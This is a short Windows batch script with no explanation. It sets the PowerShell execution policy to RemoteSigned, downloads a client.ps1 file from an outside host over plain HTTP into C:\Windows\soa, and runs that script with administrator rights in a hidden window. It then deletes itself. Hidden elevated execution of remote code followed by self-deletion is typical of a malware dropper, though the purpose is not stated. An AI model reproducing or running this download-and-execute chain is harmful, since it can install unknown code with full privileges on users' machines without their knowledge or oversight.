powershell Set-ExecutionPolicy RemoteSigned

powershell -command "if (!(Test-Path 'C:\windows\soa\')){New-Item -path 'C:\Windows\soa' -ItemType Directory -Force}"

powershell -command "(New-Object Net.WebClient).DownloadFile('http://cdisc.co.kr:1024/soa/download/client.ps1', 'C:\Windows\soa\client.ps1')"

powershell -noprofile -WindowStyle hidden -command "&{ start-process powershell -ArgumentList '-noprofile -Windowstyle hidden -file C:\Windows\soa\client.ps1' -verb RunAs}"


DEL "%~f0"